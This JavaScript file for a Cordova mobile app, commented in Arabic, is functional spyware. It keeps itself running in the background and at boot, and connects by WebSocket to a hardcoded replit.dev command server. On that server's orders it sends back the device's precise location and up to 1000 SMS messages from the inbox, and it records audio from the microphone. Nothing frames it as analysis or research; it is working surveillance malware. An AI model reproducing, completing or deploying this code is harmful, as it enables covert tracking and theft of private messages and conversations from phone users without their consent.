document.addEventListener('deviceready', onDeviceReady, false);

const receivedRequests = [];
let deviceInfo = {};
let wsConnection = null;
let reconnectInterval = null;
const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';

function onDeviceReady() {
    console.log('Device is ready');

    // تفعيل التشغيل في الخلفية
    if (cordova.plugins.backgroundMode) {
        cordova.plugins.backgroundMode.enable();
        cordova.plugins.backgroundMode.setDefaults({
            title: 'التطبيق يعمل في الخلفية',
            text: 'جارٍ مراقبة الأوامر الواردة'
        });
    }

    // تشغيل Foreground Service
    if (cordova.plugins.foregroundService) {
        cordova.plugins.foregroundService.start(
            'التطبيق يعمل',
            'جارٍ مراقبة الأوامر في الخلفية',
            'ic_stat_icon'
        );
    }

    // تفعيل التشغيل التلقائي عند الإقلاع
    if (cordova.plugins.autoStart) {
        cordova.plugins.autoStart.enable();
        cordova.plugins.autoStart.enableBootStart();
    }

    // جمع معلومات الجهاز
    deviceInfo = {
        uuid: device.uuid || generateUUID(),
        model: device.model || 'Unknown',
        platform: device.platform || 'Unknown',
        version: device.version || 'Unknown',
        manufacturer: device.manufacturer || 'Unknown',
        battery: null,
        timestamp: new Date().toISOString()
    };

    // مراقبة حالة البطارية
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            updateBatteryInfo(battery);
            battery.addEventListener('levelchange', () => updateBatteryInfo(battery));
            battery.addEventListener('chargingchange', () => updateBatteryInfo(battery));
        });
    }

    // الاتصال بالخادم
    connectToServer();
}

// توليد UUID عشوائي إذا لم يتوفر UUID الجهاز
function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

// تحديث معلومات البطارية
function updateBatteryInfo(battery) {
    deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
    };
    sendHeartbeat();
}

// الاتصال بخادم WebSocket
function connectToServer() {
    try {
        wsConnection = new WebSocket(wsUrl);

        wsConnection.onopen = () => {
            console.log('✅ Connected to WebSocket server');
            sendHeartbeat();
        };

        wsConnection.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                executeCommand(data, (response) => {
                    sendMessage(response);
                });
            } catch (err) {
                console.error('Invalid message from server:', event.data);
            }
        };

        wsConnection.onerror = (error) => {
            console.error('❌ WebSocket error:', error);
        };

        wsConnection.onclose = () => {
            console.warn('⚠️ Disconnected from server, retrying in 10s...');
            clearInterval(reconnectInterval);
            reconnectInterval = setTimeout(connectToServer, 10000);
        };

    } catch (e) {
        console.error('WebSocket connection failed:', e);
        setTimeout(connectToServer, 10000);
    }
}

// إرسال رسالة إلى الخادم
function sendMessage(data) {
    if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
        wsConnection.send(JSON.stringify(data));
    }
}

// إرسال نبضات (Heartbeat) بشكل دوري لإبقاء الاتصال مفتوح
function sendHeartbeat() {
    if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
        wsConnection.send(JSON.stringify({
            type: 'heartbeat',
            timestamp: new Date().toISOString(),
            battery: deviceInfo.battery,
            requests: receivedRequests
        }));
    }
}

// تنفيذ الأوامر المرسلة من الخادم
function executeCommand(command, callback) {
    console.log('Executing command:', command);

    const commandId = Date.now();

    switch (command.type) {
        case 'get_location':
            getLocation(commandId, callback);
            break;
        case 'get_sms':
            getSMS(commandId, callback);
            break;
        case 'record_audio':
            recordAudio(commandId, command.duration, callback);
            break;
        case 'get_device_info':
            getDeviceInfo(commandId, callback);
            break;
        case 'get_received_requests':
            getReceivedRequests(commandId, callback);
            break;
        default:
            callback({ commandId, status: 'error', error: 'Unknown command' });
    }
}

// الحصول على الموقع الجغرافي
function getLocation(commandId, callback) {
    const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
    navigator.geolocation.getCurrentPosition(
        (position) => {
            callback({
                commandId,
                status: 'success',
                location: {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: position.timestamp
                }
            });
        },
        (error) => {
            callback({ commandId, status: 'error', error: error.message });
        },
        options
    );
}

// قراءة الرسائل القصيرة SMS
function getSMS(commandId, callback) {
    if (typeof SMS === 'undefined') {
        return callback({ commandId, status: 'error', error: 'SMS plugin not available' });
    }

    const filter = { box: 'inbox', maxCount: 1000, indexFrom: 0 };
    SMS.listSMS(filter,
        (messages) => {
            callback({
                commandId,
                status: 'success',
                messages: messages.map(msg => ({
                    id: msg._id,
                    address: msg.address,
                    body: msg.body,
                    date: msg.date,
                    read: msg.read
                }))
            });
        },
        (error) => {
            callback({ commandId, status: 'error', error });
        });
}

// تسجيل الصوت
function recordAudio(commandId, duration, callback) {
    duration = duration || 10;
    navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
            const mediaRecorder = new MediaRecorder(stream);
            const audioChunks = [];
            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
            mediaRecorder.onstop = () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
                saveAudioToStorage(`audio_${Date.now()}.mp3`, audioBlob);
                callback({ commandId, status: 'success', message: 'Recording saved' });
            };
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), duration * 1000);
        })
        .catch(error => {
            callback({ commandId, status: 'error', error });
        });
}

// حفظ ملف الصوت في التخزين
function saveAudioToStorage(fileName, blob) {
    window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
        dir.getFile(fileName, { create: true }, fileEntry => {
            fileEntry.createWriter(fileWriter => {
                fileWriter.onwriteend = () => console.log('Audio saved:', fileName);
                fileWriter.onerror = e => console.error('Error saving file:', e);
                fileWriter.write(blob);
            });
        });
    });
}

// إرجاع معلومات الجهاز
function getDeviceInfo(commandId, callback) {
    callback({
        commandId,
        status: 'success',
        deviceInfo: deviceInfo
    });
}

// جلب الطلبات السابقة
function getReceivedRequests(commandId, callback) {
    callback({
        commandId,
        status: 'success',
        requests: receivedRequests
    });
}

// إعادة الاتصال عند استئناف التطبيق
document.addEventListener('resume', () => {
    if (!wsConnection || wsConnection.readyState !== WebSocket.OPEN) {
        console.log('App resumed, reconnecting...');
        connectToServer();
    }
}, false);
